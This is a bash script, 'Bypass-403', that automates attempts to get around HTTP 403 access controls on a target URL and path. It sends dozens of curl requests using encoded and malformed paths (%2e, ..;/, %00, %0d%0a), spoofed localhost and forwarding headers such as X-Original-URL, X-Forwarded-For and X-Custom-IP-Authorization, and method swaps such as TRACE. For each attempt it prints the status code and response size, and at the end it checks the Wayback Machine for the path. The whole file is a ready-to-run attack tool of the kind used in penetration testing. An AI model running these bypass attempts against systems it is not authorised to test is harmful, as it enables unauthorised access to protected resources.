#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker "
echo "                                               upgrade by mhdy3p"
echo "./bypass-403.sh https://example.com path"
echo " "
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2f$2/
echo "  --> ${1}/%2f/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1%2f$2%2f
echo "  --> ${1}%2f${2}%2f"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1///$2///
echo "  --> ${1}///${2}///"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/
echo "  --> ${1}/./${2}/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2/./
echo "  --> ${1}//${2}/./"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Port" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Port"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Scheme" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Scheme"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "nullOrigin: monster.attacker.com" $1/$2
echo "  --> ${1}/${2} -H nullOrigin: monster.attacker.com"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Frame-Options: Allow" $1/$2
echo "  --> ${1}/${2} -H X-Frame-Options: Allow"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Base-Url: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Base-Url: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Http-Url: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Http-Url: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Uri: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Uri: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Http-Destinationurl: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Http-Destinationurl: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Http-Host-Override: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Http-Host-Override: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-Remote-Addr: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Original-Remote-Addr: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Proxy-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Proxy-Host: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarder-For: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarder-For: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Server: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Server: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referer: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Referer: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Referrer: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Referrer: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Refferer: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Refferer: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Redirect: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Redirect: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Request-Uri: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Request-Uri: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-ProxyUser-Ip: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-ProxyUser-Ip: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Client-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H Client-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Host: localhost" $1/$2
echo "  --> ${1}/${2} -H Host: localhost"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Originating-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Originating-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-Addr: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Remote-Addr: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Real-IP: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Real-IP: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
echo "  --> ${1} -H X-rewrite-url: ${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%00
echo "  --> ${1}/${2}%00"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%0d%0a
echo "  --> ${1}/${2}%0d%0a"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/*$2/
echo "  --> ${1}/*${2}/"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/;/$2/"
echo "  --> ${1}/;/${2}/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1//;//$2/"
echo "  --> ${1}//;//${2}/"

#updated
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2} -X TRACE"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'
